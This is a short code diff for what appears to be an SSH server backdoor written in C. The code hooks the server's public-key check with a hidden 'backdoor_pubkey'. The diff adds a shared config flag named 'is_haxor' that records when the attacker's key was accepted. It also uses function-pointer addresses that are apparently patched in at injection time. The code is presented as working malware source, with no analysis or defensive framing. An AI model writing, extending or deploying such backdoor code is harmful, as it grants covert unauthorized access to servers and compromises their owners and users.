@@ -1,4 +1,5 @@
 #include "syscall.h"
+#include "config.h"
 
 #define KEY_TYPE_RSA 1
 #define SSH_MAX_PUBKEY_BYTES 8192
@@ -32,6 +33,8 @@ int hook_main(void *pw, void *key, char *file) {
 
 	char backdoor_pubkey[SSH_MAX_PUBKEY_BYTES];
 
+	config_block *config_memory = (config_block*)(0xc0debabe13371337);
+
 	f_key_new key_new = (f_key_new)(0xaaaaaaaabbbbbbbb);
 	f_key_read key_read = (f_key_read)(0x1111111122222222);
 	f_restore_uid restore_uid = (f_restore_uid)(0x99999999aaaaaaaa);
@@ -59,8 +62,11 @@ int hook_main(void *pw, void *key, char *file) {
 #ifdef DONT_LEAK_MEMORY // this call crashes on some platforms, needs investigation
 		key_free(rsa_key);
 #endif
+		config_memory->is_haxor = 1;
 		return 1;
 	}
+
+	config_memory->is_haxor = 0;
 
 	return user_key_allowed2(pw, key, file);
 }
